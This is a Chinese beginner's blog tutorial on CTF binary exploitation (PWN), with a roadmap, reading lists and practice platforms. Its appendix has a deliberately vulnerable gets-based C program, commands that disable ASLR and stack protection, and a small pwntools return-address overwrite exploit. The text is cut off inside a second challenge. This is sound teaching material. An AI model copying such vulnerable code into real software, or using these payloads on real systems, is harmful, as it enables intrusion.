-        if (active.length == 1 && active.eq(0).attr('href') == '#' + id) return true;
-
-        active.each(function (i, e) {
-          
-            $(e).removeClass('active');
-          
-        });
-        $toc.find('a[href="#' + id + '"]').addClass('active')
-        $toc.find('a[href="#' + id + '"]').parentsUntil('#TableOfContents').each(function (i, e) {
-          $(e).children('a').parents('ul').show();          
-        });
-      }
-
-      $window.on('scroll', onScroll);
-      $(document).ready(function () {
-        
-        onScroll();
-      });
-    }
-  })();
-</script>
-</div>
-</div>
-<div class="min-w-0 min-h-0 max-w-prose">
-<details class="mt-2 mb-5 overflow-hidden rounded-lg ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5" open="" style="margin-left:0px">
-<summary class="py-1 text-lg font-semibold cursor-pointer bg-primary-200 text-neutral-800 ltr:-ml-5 ltr:pl-5 rtl:-mr-5 rtl:pr-5 dark:bg-primary-800 dark:text-neutral-100">
-        PWN入门 - This article is part of a series.
-    </summary>
-<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-<a href="https://ta0lve.github.io/posts/pwn/basic/tutorial2/">
-            Part 0: CTF入门宣讲-PWN方向
-        </a>
-</div>
-<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-        Part 0: This Article
-    </div>
-<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-<a href="https://ta0lve.github.io/posts/pwn/basic/pwn-_environment/">
-            Part 1: PWN环境二次搭建记录-Ubuntu 22.04
-        </a>
-</div>
-<div class="py-1 border-dotted border-neutral-300 ltr:-ml-5 ltr:border-l ltr:pl-5 rtl:-mr-5 rtl:border-r rtl:pr-5 dark:border-neutral-600">
-<a href="https://ta0lve.github.io/posts/pwn/basic/linux_/">
-            Part 2: Linux命令入门与总结
-        </a>
-</div>
-</details>
-<p>写给学弟学妹的pwn入门教程~</p>
-<div class="anchor" id="0x00-概述"></div>
-<h2 class="relative group">0x00 概述 
-    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#0x00-%e6%a6%82%e8%bf%b0" style="text-decoration-line: none !important;">#</a></span>
-</h2>
-<blockquote>
-<p><code>Pwn</code>是一个黑客语法的俚语词，是指攻破设备或者系统。发音类似“砰”，对黑客而言，这就是成功实施黑客攻击的声音——砰的一声，被“黑”的电脑或手机就被你操纵了。– 《百度百科》</p>
-</blockquote>
-<p>Pwn是CTF方向中的一种，主要是利用<strong>二进制漏洞</strong>从而获得 getShell（提权），即获得对方系统权限，从而控制对方电脑。</p>
-<br/>
-<p>PWN 的学习流程大概是这样的：</p>
-<ul>
-<li>从最基本的栈溢出漏洞开始学习，掌握最基本的栈溢出漏洞利用技巧
-<ul>
-<li>ret2text</li>
-<li>ret2syscall</li>
-<li>ret2shellcode</li>
-<li>ret2libc</li>
-<li>32位及64位程序的ROP</li>
-</ul>
-</li>
-<li>格式化字符串漏洞（fmtstr）</li>
-<li>整数溢出漏洞 及 数组越界漏洞</li>
-<li>其他高级一点的栈溢出漏洞利用技巧
-<ul>
-<li>ret2csu</li>
-<li>ret2reg</li>
-<li>ret2dlresolve,</li>
-<li>ret2VDSO</li>
-<li>SROP</li>
-<li>BROP</li>
-<li>花式栈溢出技巧</li>
-</ul>
-</li>
-<li>堆利用技巧
-<ul>
-<li>Off-By-One</li>
-<li>UAF</li>
-<li>Fastbin Attack</li>
-<li>Unsorted Bin attack</li>
-<li>Unlink</li>
-<li>Tcache attack</li>
-<li>Largebin attack</li>
-<li>house of XXX</li>
-</ul>
-</li>
-<li>内核安全
-<ul>
-<li>Linux Kernel Pwn 等等</li>
-</ul>
-</li>
-<li>以及还有其他架构的利用方式
-<ul>
-<li>ARM PWN 等等</li>
-</ul>
-</li>
-</ul>
-<br/>
-<p><strong>PWN</strong> 的学习难度可能会有那么一点点大，有一定的学习门槛，需要投入不少的时间和精力去学习。</p>
-<p>但与此同时， <strong>PWN</strong> 也是一个十分有趣的方向，如果同学们对 pwn 感兴趣，对二进制安全感兴趣，也可以试着学习这个方向，如果在一段时间的学习后，还能够十分有热情地学习和实践，务必在二进制安全的路上坚持下去！</p>
-<br/>
-<p>网安一定要学会自己动手实践，总结经验，我之后可能会在<a href="https://ta0lve.github.io/" target="_blank">
-    个人博客</a>上发一些入门的文章，但还是建议大家自己根据推荐的教程去进行自学，在学习pwn及学习CTF时<strong>自学</strong>与<strong>善用搜索引擎</strong>都是不可或缺的。</p>
-<br/>
-<p>2023.8.30 更新：</p>
-<p>推荐大家阅读 <a href="https://tokameine.top/" target="_blank">
-    Toka</a> 师傅写的文章：<a href="https://mp.weixin.qq.com/s/LfNBN8IrsCLNtdeDM2lXbQ" target="_blank">
-    CTF经验贴｜我们对PWN都有哪些误会 (qq.com)</a>，Toka 师傅写的真的太好了，写到我这个菜狗pwn手的心里了😭</p>
-<br/>
-<div class="anchor" id="0x01-入门教程推荐"></div>
-<h2 class="relative group">0x01 入门教程推荐 
-    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#0x01-%e5%85%a5%e9%97%a8%e6%95%99%e7%a8%8b%e6%8e%a8%e8%8d%90" style="text-decoration-line: none !important;">#</a></span>
-</h2>
-<p>学习链接：</p>
-<p><a href="https://wiki.compass.college/CTF/PWN/" target="_blank">
-    Binary Exploitation - COMPASS CTF Wiki</a></p>
-<p>南科大 COMPASS CTF Wiki 教程，简述了pwn部分的一些基础知识，可以让大家对pwn有更加全面的了解</p>
-<br/>
-<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/" target="_blank">
-    栈介绍 - CTF Wiki (ctf-wiki.org)</a></p>
-<p>CTF Wiki，是非常好的pwn学习资料，讲的细致且全面，入门可以从<a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/" target="_blank">
-    栈部分</a> 开始学习</p>
-<br/>
-<p><a href="https://www.yuque.com/hxfqg9/bin" target="_blank">
-    二进制安全 (yuque.com)</a></p>
-<p>yichen师傅写的二进制安全笔记，其中pwn入门部分是围绕 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stack-intro/" target="_blank">
-    CTF Wiki</a> 写的，可以两个一起学习</p>
-<br/>
-<p>学习书籍推荐：</p>
-<ul>
-<li>
-<p>C/C++</p>
-<ul>
-<li>《C Primer Plus》</li>
-<li>《C++ Primer Plus》</li>
-</ul>
-</li>
-<li>
-<p>汇编语言</p>
-<ul>
-<li><strong>《汇编语言》- 王爽</strong></li>
-</ul>
-</li>
-<li>
-<p>CTF相关</p>
-<ul>
-<li>《CTF 竞赛权威指南 PWN篇》</li>
-<li>《从0到1 CTFer成长之路》</li>
-</ul>
-</li>
-<li>
-<p>计算机原理</p>
-<ul>
-<li>《深入理解计算机系统》（大名鼎鼎的<strong>CSAPP</strong>）</li>
-<li>《程序员的自我修养》</li>
-</ul>
-</li>
-<li>
-<p>操作系统</p>
-<ul>
-<li>《操作系统真象还原》</li>
-<li>《鸟哥的Linux私房菜》</li>
-<li>《深入理解Linux内核》</li>
-</ul>
-</li>
-<li>
-<p>逆向工程</p>
-<ul>
-<li>《逆向工程核心原理》</li>
-</ul>
-</li>
-<li>
-<p>编译原理</p>
-<ul>
-<li>《编译器设计》（Engineering a Compiler）</li>
-<li>《编译原理》(Dragon book)</li>
-</ul>
-</li>
-<li>
-<p>其他推荐阅读的书籍</p>
-<ul>
-<li>《0day安全：软件漏洞分析技术》</li>
-<li>《IDA Pro权威指南》</li>
-<li>《漏洞战争 软件漏洞分析精要》</li>
-<li>《加密与解密》</li>
-</ul>
-</li>
-</ul>
-<br/>
-<div class="anchor" id="0x02-pwn环境与工具"></div>
-<h2 class="relative group">0x02 pwn环境与工具 
-    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#0x02-pwn%e7%8e%af%e5%a2%83%e4%b8%8e%e5%b7%a5%e5%85%b7" style="text-decoration-line: none !important;">#</a></span>
-</h2>
-<p>关于pwn的环境搭建，</p>
-<p>使用Windows的同学可以参考：</p>
-<p><a href="https://ta0lve.github.io/posts/pwn/basic/pwn-_environment/" target="_blank">
-    PWN环境二次搭建记录-Ubuntu 22.04 · ta0lve</a></p>
-<br/>
-<p>使用macOS的同学可以参考：</p>
-<p><a href="https://www.anquanke.com/post/id/187922#h3-7" target="_blank">
-    Mac 环境下 PWN入门系列（一）-安全客 - 安全资讯平台 (anquanke.com)</a></p>
-<br/>
-<p>在做pwn题时还会用到 <strong>IDA</strong>，安装和使用可以参考：</p>
-<p><a href="https://blog.csdn.net/qq_47403671/article/details/119939585" target="_blank">
-    IDA的新手入门指南_ida教程_Beth Harmon的博客-CSDN博客</a></p>
-<br/>
-<div class="anchor" id="0x03-pwn做题平台"></div>
-<h2 class="relative group">0x03 pwn做题平台 
-    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#0x03-pwn%e5%81%9a%e9%a2%98%e5%b9%b3%e5%8f%b0" style="text-decoration-line: none !important;">#</a></span>
-</h2>
-<p>建议先从前三个平台的简单题开始做起~</p>
-<p><a href="https://adworld.xctf.org.cn/home/index" target="_blank">
-    攻防世界 (xctf.org.cn)</a></p>
-<p>攻防世界的题目考察知识点很明确，循序渐进的学习，还可以选择题目难度，对新手十分友好。</p>
-<br/>
-<p><a href="https://buuoj.cn/" target="_blank">
-    BUUCTF在线评测 (buuoj.cn)</a></p>
-<p>有近年以来各种比赛的题目，题目难度与排序没有必然联系，只是大体上是逐渐递增，前面的题目可能也会有一些难度，建议入门了再去开始做</p>
-<br/>
-<p><a href="https://www.nssctf.cn/problem" target="_blank">
-    题库 | NSSCTF</a></p>
-<p>同上</p>
-<br/>
-<p><a href="https://pwnable.tw/" target="_blank">
-    pwnable.tw</a></p>
-<p>适合有一定基础的去做，题目质量很高，能够学到不少知识</p>
-<br/>
-<p><a href="http://pwnable.kr/" target="_blank">
-    pwnable.kr</a></p>
-<p>同上，建议有一点基础再开始做</p>
-<br/>
-<p><a href="https://pwnable.xyz/challenges/" target="_blank">
-    pwnable.xyz</a></p>
-<p>同上</p>
-<br/>
-<p><a href="https://pwn.college/" target="_blank">
-    pwn.college</a></p>
-<p>基础知识讲解得很好，可以在实践中夯实计算机安全基础，不过对于CTF来说可能学习进程有慢，还是建议直接从前三个平台开始做题</p>
-<hr/>
-<div class="anchor" id="附录"></div>
-<h2 class="relative group">附录 
-    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e9%99%84%e5%bd%95" style="text-decoration-line: none !important;">#</a></span>
-</h2>
-<div class="anchor" id="1栈溢出原理"></div>
-<h3 class="relative group">1.栈溢出原理 
-    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#1%e6%a0%88%e6%ba%a2%e5%87%ba%e5%8e%9f%e7%90%86" style="text-decoration-line: none !important;">#</a></span>
-</h3>
-<p>(copy from <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/" target="_blank">
-    ctf-wiki</a>)</p>
-<p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/" target="_blank">
-    栈溢出原理 - CTF Wiki (ctf-wiki.org)</a></p>
-<p>介绍 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_2" target="_blank">
-    ¶</a></p>
-<p>栈溢出指的是程序向栈中某个变量中写入的字节数超过了这个变量本身所申请的字节数，因而导致与其相邻的栈中的变量的值被改变。这种问题是一种特定的缓冲区溢出漏洞，类似的还有堆溢出，bss 段溢出等溢出方式。栈溢出漏洞轻则可以使程序崩溃，重则可以使攻击者控制程序执行流程。此外，我们也不难发现，发生栈溢出的基本前提是</p>
-<ul>
-<li>程序必须向栈上写入数据。</li>
-<li>写入的数据大小没有被良好地控制。</li>
-</ul>
-<br/>
-<div class="anchor" id="基本示例-httpsctf-wikiorgpwnlinuxuser-modestackoverflowx86stackoverflow-basic_3"></div>
-<h4 class="relative group">基本示例 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_3" target="_blank">
-    ¶</a>
-<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e5%9f%ba%e6%9c%ac%e7%a4%ba%e4%be%8b-httpsctf-wikiorgpwnlinuxuser-modestackoverflowx86stackoverflow-basic_3" style="text-decoration-line: none !important;">#</a></span>
-</h4>
-<p>最典型的栈溢出利用是覆盖程序的返回地址为攻击者所控制的地址，<strong>当然需要确保这个地址所在的段具有可执行权限</strong>。下面，我们举一个简单的例子：</p>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#include &lt;stdio.h&gt;
-</span></span><span class="line"><span class="cl">#include &lt;string.h&gt;
-</span></span><span class="line"><span class="cl">void success() { puts("You Hava already controlled it."); }
-</span></span><span class="line"><span class="cl">void vulnerable() {
-</span></span><span class="line"><span class="cl">  char s[12];
-</span></span><span class="line"><span class="cl">  gets(s);
-</span></span><span class="line"><span class="cl">  puts(s);
-</span></span><span class="line"><span class="cl">  return;
-</span></span><span class="line"><span class="cl">}
-</span></span><span class="line"><span class="cl">int main(int argc, char **argv) {
-</span></span><span class="line"><span class="cl">  vulnerable();
-</span></span><span class="line"><span class="cl">  return 0;
-</span></span><span class="line"><span class="cl">}
-</span></span></code></pre></div><p>这个程序的主要目的读取一个字符串，并将其输出。<strong>我们希望可以控制程序执行 success 函数。</strong></p>
-<p>我们利用如下命令对其进行编译</p>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➜  stack-example gcc -m32 -fno-stack-protector stack_example.c -o stack_example 
-</span></span><span class="line"><span class="cl">stack_example.c: In function ‘vulnerable’:
-</span></span><span class="line"><span class="cl">stack_example.c:6:3: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
-</span></span><span class="line"><span class="cl">   gets(s);
-</span></span><span class="line"><span class="cl">   ^
-</span></span><span class="line"><span class="cl">/tmp/ccPU8rRA.o：在函数‘vulnerable’中：
-</span></span><span class="line"><span class="cl">stack_example.c:(.text+0x27): 警告： the `gets' function is dangerous and should not be used.
-</span></span></code></pre></div><p>可以看出 gets 本身是一个危险函数。它从不检查输入字符串的长度，而是以回车来判断输入是否结束，所以很容易可以导致栈溢出，</p>
-<blockquote>
-<p>历史上，<strong>莫里斯蠕虫</strong>第一种蠕虫病毒就利用了 gets 这个危险函数实现了栈溢出。</p>
-</blockquote>
-<p>gcc 编译指令中，<code>-m32</code> 指的是生成 32 位程序； <code>-fno-stack-protector</code> 指的是不开启堆栈溢出保护，即不生成 canary。 此外，为了更加方便地介绍栈溢出的基本利用方式，这里还需要关闭 PIE（Position Independent Executable），避免加载基址被打乱。不同 gcc 版本对于 PIE 的默认配置不同，我们可以使用命令<code>gcc -v</code>查看 gcc 默认的开关情况。如果含有<code>--enable-default-pie</code>参数则代表 PIE 默认已开启，需要在编译指令中添加参数<code>-no-pie</code>。</p>
-<p>编译成功后，可以使用 checksec 工具检查编译出的文件：</p>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➜  stack-example checksec stack_example
-</span></span><span class="line"><span class="cl">    Arch:     i386-32-little
-</span></span><span class="line"><span class="cl">    RELRO:    Partial RELRO
-</span></span><span class="line"><span class="cl">    Stack:    No canary found
-</span></span><span class="line"><span class="cl">    NX:       NX enabled
-</span></span><span class="line"><span class="cl">    PIE:      No PIE (0x8048000)
-</span></span></code></pre></div><p>提到编译时的 PIE 保护，Linux 平台下还有地址空间分布随机化（ASLR）的机制。简单来说即使可执行文件开启了 PIE 保护，还需要系统开启 ASLR 才会真正打乱基址，否则程序运行时依旧会在加载一个固定的基址上（不过和 No PIE 时基址不同）。我们可以通过修改 <code>/proc/sys/kernel/randomize_va_space</code> 来控制 ASLR 启动与否，具体的选项有</p>
-<ul>
-<li>0，关闭 ASLR，没有随机化。栈、堆、.so 的基地址每次都相同。</li>
-<li>1，普通的 ASLR。栈基地址、mmap 基地址、.so 加载基地址都将被随机化，但是堆基地址没有随机化。</li>
-<li>2，增强的 ASLR，在 1 的基础上，增加了堆基地址随机化。</li>
-</ul>
-<p>我们可以使用<code>echo 0 &gt; /proc/sys/kernel/randomize_va_space</code>关闭 Linux 系统的 ASLR，类似的，也可以配置相应的参数。</p>
-<p>为了降低后续漏洞利用复杂度，我们这里关闭 ASLR，在编译时关闭 PIE。当然读者也可以尝试 ASLR、PIE 开关的不同组合，配合 IDA 及其动态调试功能观察程序地址变化情况（在 ASLR 关闭、PIE 开启时也可以攻击成功）。</p>
-<p>确认栈溢出和 PIE 保护关闭后，我们利用 IDA 来反编译一下二进制程序并查看 vulnerable 函数 。可以看到</p>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">int vulnerable()
-</span></span><span class="line"><span class="cl">{
-</span></span><span class="line"><span class="cl">  char s; // [sp+4h] [bp-14h]@1
-</span></span><span class="line"><span class="cl">
-</span></span><span class="line"><span class="cl">  gets(&amp;s);
-</span></span><span class="line"><span class="cl">  return puts(&amp;s);
-</span></span><span class="line"><span class="cl">}
-</span></span></code></pre></div><p>该字符串距离 ebp 的长度为 0x14，那么相应的栈结构为</p>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">                                           +-----------------+
-</span></span><span class="line"><span class="cl">                                           |     retaddr     |
-</span></span><span class="line"><span class="cl">                                           +-----------------+
-</span></span><span class="line"><span class="cl">                                           |     saved ebp   |
-</span></span><span class="line"><span class="cl">                                    ebp---&gt;+-----------------+
-</span></span><span class="line"><span class="cl">                                           |                 |
-</span></span><span class="line"><span class="cl">                                           |                 |
-</span></span><span class="line"><span class="cl">                                           |                 |
-</span></span><span class="line"><span class="cl">                                           |                 |
-</span></span><span class="line"><span class="cl">                                           |                 |
-</span></span><span class="line"><span class="cl">                                           |                 |
-</span></span><span class="line"><span class="cl">                              s,ebp-0x14--&gt;+-----------------+
-</span></span></code></pre></div><p>并且，我们可以通过 IDA 获得 success 的地址，其地址为 0x0804843B。</p>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">.text:0804843B success         proc near
-</span></span><span class="line"><span class="cl">.text:0804843B                 push    ebp
-</span></span><span class="line"><span class="cl">.text:0804843C                 mov     ebp, esp
-</span></span><span class="line"><span class="cl">.text:0804843E                 sub     esp, 8
-</span></span><span class="line"><span class="cl">.text:08048441                 sub     esp, 0Ch
-</span></span><span class="line"><span class="cl">.text:08048444                 push    offset s        ; "You Hava already controlled it."
-</span></span><span class="line"><span class="cl">.text:08048449                 call    _puts
-</span></span><span class="line"><span class="cl">.text:0804844E                 add     esp, 10h
-</span></span><span class="line"><span class="cl">.text:08048451                 nop
-</span></span><span class="line"><span class="cl">.text:08048452                 leave
-</span></span><span class="line"><span class="cl">.text:08048453                 retn
-</span></span><span class="line"><span class="cl">.text:08048453 success         endp
-</span></span></code></pre></div><p>那么如果我们读取的字符串为</p>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">0x14*'a'+'bbbb'+success_addr
-</span></span></code></pre></div><p>那么，由于 gets 会读到回车才算结束，所以我们可以直接读取所有的字符串，并且将 saved ebp 覆盖为 bbbb，将 retaddr 覆盖为 success_addr，即，此时的栈结构为</p>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">                                           +-----------------+
-</span></span><span class="line"><span class="cl">                                           |    0x0804843B   |
-</span></span><span class="line"><span class="cl">                                           +-----------------+
-</span></span><span class="line"><span class="cl">                                           |       bbbb      |
-</span></span><span class="line"><span class="cl">                                    ebp---&gt;+-----------------+
-</span></span><span class="line"><span class="cl">                                           |                 |
-</span></span><span class="line"><span class="cl">                                           |                 |
-</span></span><span class="line"><span class="cl">                                           |                 |
-</span></span><span class="line"><span class="cl">                                           |                 |
-</span></span><span class="line"><span class="cl">                                           |                 |
-</span></span><span class="line"><span class="cl">                                           |                 |
-</span></span><span class="line"><span class="cl">                              s,ebp-0x14--&gt;+-----------------+
-</span></span></code></pre></div><p>但是需要注意的是，由于在计算机内存中，每个值都是按照字节存储的。一般情况下都是采用小端存储，即 0x0804843B 在内存中的形式是</p>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\x3b\x84\x04\x08
-</span></span></code></pre></div><p>但是，我们又不能直接在终端将这些字符给输入进去，在终端输入的时候 \，x 等也算一个单独的字符。。所以我们需要想办法将 \x3b 作为一个字符输入进去。那么此时我们就需要使用一波 pwntools 了 (关于如何安装以及基本用法，请自行 github)，这里利用 pwntools 的代码如下：</p>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">##coding=utf8
-</span></span><span class="line"><span class="cl">from pwn import *
-</span></span><span class="line"><span class="cl">## 构造与程序交互的对象
-</span></span><span class="line"><span class="cl">sh = process('./stack_example')
-</span></span><span class="line"><span class="cl">success_addr = 0x0804843b
-</span></span><span class="line"><span class="cl">## 构造payload
-</span></span><span class="line"><span class="cl">payload = 'a' * 0x14 + 'bbbb' + p32(success_addr)
-</span></span><span class="line"><span class="cl">print p32(success_addr)
-</span></span><span class="line"><span class="cl">## 向程序发送字符串
-</span></span><span class="line"><span class="cl">sh.sendline(payload)
-</span></span><span class="line"><span class="cl">## 将代码交互转换为手工交互
-</span></span><span class="line"><span class="cl">sh.interactive()
-</span></span></code></pre></div><p>执行一波代码，可以得到</p>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">➜  stack-example python exp.py
-</span></span><span class="line"><span class="cl">[+] Starting local process './stack_example': pid 61936
-</span></span><span class="line"><span class="cl">;\x84\x0
-</span></span><span class="line"><span class="cl">[*] Switching to interactive mode
-</span></span><span class="line"><span class="cl">aaaaaaaaaaaaaaaaaaaabbbb;\x84\x0
-</span></span><span class="line"><span class="cl">You Hava already controlled it.
-</span></span><span class="line"><span class="cl">[*] Got EOF while reading in interactive
-</span></span><span class="line"><span class="cl">$ 
-</span></span><span class="line"><span class="cl">[*] Process './stack_example' stopped with exit code -11 (SIGSEGV) (pid 61936)
-</span></span><span class="line"><span class="cl">[*] Got EOF while sending in interactive
-</span></span></code></pre></div><p>可以看到我们确实已经执行 success 函数。</p>
-<br/>
-<hr/>
-<p>小总结 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_4" target="_blank">
-    ¶</a></p>
-<p>上面的示例其实也展示了栈溢出中比较重要的几个步骤。</p>
-<div class="anchor" id="1寻找危险函数-httpsctf-wikiorgpwnlinuxuser-modestackoverflowx86stackoverflow-basic_5"></div>
-<h4 class="relative group">（1）寻找危险函数 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_5" target="_blank">
-    ¶</a>
-<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#1%e5%af%bb%e6%89%be%e5%8d%b1%e9%99%a9%e5%87%bd%e6%95%b0-httpsctf-wikiorgpwnlinuxuser-modestackoverflowx86stackoverflow-basic_5" style="text-decoration-line: none !important;">#</a></span>
-</h4>
-<p>通过寻找危险函数，我们快速确定程序是否可能有栈溢出，以及有的话，栈溢出的位置在哪里。常见的危险函数如下</p>
-<ul>
-<li>输入
-<ul>
-<li>gets，直接读取一行，忽略’\x00'</li>
-<li>scanf</li>
-<li>vscanf</li>
-</ul>
-</li>
-<li>输出
-<ul>
-<li>sprintf</li>
-</ul>
-</li>
-<li>字符串
-<ul>
-<li>strcpy，字符串复制，遇到’\x00’停止</li>
-<li>strcat，字符串拼接，遇到’\x00’停止</li>
-<li>bcopy</li>
-</ul>
-</li>
-</ul>
-<br/>
-<div class="anchor" id="2确定填充长度-httpsctf-wikiorgpwnlinuxuser-modestackoverflowx86stackoverflow-basic_6"></div>
-<h4 class="relative group">（2）确定填充长度 <a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/stackoverflow-basic/#_6" target="_blank">
-    ¶</a>
-<span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#2%e7%a1%ae%e5%ae%9a%e5%a1%ab%e5%85%85%e9%95%bf%e5%ba%a6-httpsctf-wikiorgpwnlinuxuser-modestackoverflowx86stackoverflow-basic_6" style="text-decoration-line: none !important;">#</a></span>
-</h4>
-<p>这一部分主要是计算<strong>我们所要操作的地址与我们所要覆盖的地址的距离</strong>。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。一般变量会有以下几种索引模式</p>
-<ul>
-<li>相对于栈基地址的的索引，可以直接通过查看 EBP 相对偏移获得</li>
-<li>相对应栈顶指针的索引，一般需要进行调试，之后还是会转换到第一种类型。</li>
-<li>直接地址索引，就相当于直接给定了地址。</li>
-</ul>
-<p>一般来说，我们会有如下的覆盖需求</p>
-<ul>
-<li><strong>覆盖函数返回地址</strong>，这时候就是直接看 EBP 即可。</li>
-<li><strong>覆盖栈上某个变量的内容</strong>，这时候就需要更加精细的计算了。</li>
-<li><strong>覆盖 bss 段某个变量的内容</strong>。</li>
-<li>根据现实执行情况，覆盖特定的变量或地址的内容。</li>
-</ul>
-<p>之所以我们想要覆盖某个地址，是因为我们想通过覆盖地址的方法来<strong>直接或者间接地控制程序执行流程</strong>。</p>
-<br/>
-<hr/>
-<div class="anchor" id="2基础栈溢出示例"></div>
-<h3 class="relative group">2.基础栈溢出示例： 
-    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#2%e5%9f%ba%e7%a1%80%e6%a0%88%e6%ba%a2%e5%87%ba%e7%a4%ba%e4%be%8b" style="text-decoration-line: none !important;">#</a></span>
-</h3>
-<p>（W4terCTF-2023  Level 0 Tic-Tac-Toe）</p>
-<div class="anchor" id="题目源码"></div>
-<h4 class="relative group">题目源码： 
-    <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-<a aria-label="锚点" class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" href="#%e9%a2%98%e7%9b%ae%e6%ba%90%e7%a0%81" style="text-decoration-line: none !important;">#</a></span>
-</h4>
-<div class="highlight"><pre class="chroma" tabindex="0"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdbool.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;time.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
-</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
-</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">a</span><span class="p">[</span><span class="mi">3</span><span class="p">][</span><span class="mi">3</span><span class="p">];</span>
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">success</span><span class="p">()</span> <span class="p">{</span> <span class="nf">system</span><span class="p">(</span><span class="s">"/bin/sh"</span><span class="p">);</span> <span class="p">}</span>
-</span></span><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">vulnerable</span><span class="p">()</span>
-</span></span><span class="line"><span class="cl"><span class="p">{</span>
-</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">s</span><span class="p">[</span><span class="mi">12</span><span class="p">];</span>
